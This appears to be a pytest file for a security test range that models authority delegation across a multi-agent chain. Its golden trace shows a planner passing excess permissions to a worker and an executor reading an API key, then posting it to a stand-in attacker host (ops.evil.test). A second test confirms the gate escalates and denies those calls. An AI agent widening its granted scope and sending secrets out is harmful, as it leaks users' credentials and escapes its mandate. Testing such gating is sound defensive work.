from __future__ import annotations

import asyncio

from hopscope.range.demo import run_demo, summarize
from hopscope.tools.authority import T1
from hopscope.tools.gate import Ruling

GOLDEN = [
    "run demo-0 level=A0 root=[fs:read:/workspace/*, net:fetch:docs.example.com]",
    "hop0 user->orchestrator ok",
    "hop1 orchestrator->planner ok",
    "hop2 planner->worker ok",
    "hop3 worker->executor ok",
    "hop2 planner->worker EXCESS: net:post:ops.evil.test, secrets:get:*",
    "hop3 worker->executor ok",
    "tool#0 executor fs:read:/workspace/README.md executed=True IN_MANDATE",
    "tool#1 executor secrets:get:api_key executed=True CANDIDATE",
    "tool#2 executor net:post:ops.evil.test executed=True CANDIDATE",
]


def test_demo_golden_trace() -> None:
    run = asyncio.run(run_demo())
    assert run.result.ok
    assert summarize(run) == GOLDEN


def test_demo_is_reproducible() -> None:
    assert summarize(asyncio.run(run_demo())) == summarize(asyncio.run(run_demo()))


def test_canary_reaches_attacker_outbox() -> None:
    run = asyncio.run(run_demo())
    post = run.tool_events[2]
    assert post.executed and post.call.args["body"] == "HOPSCOPE-CANARY-api_key"
    assert run.tool_events[1].result == "HOPSCOPE-CANARY-api_key"


def test_t1_executor_escalates_and_nothing_leaks() -> None:
    run = asyncio.run(run_demo(authority=T1))
    assert [e.ruling for e in run.tool_events] == [Ruling.IN_MANDATE, Ruling.ESCALATION, Ruling.ESCALATION]
    assert [e.executed for e in run.tool_events] == [True, False, False]
    assert all(e.error == f"denied: {e.required}" for e in run.tool_events[1:])
    assert run.tool_events[1].result is None and run.authority == T1
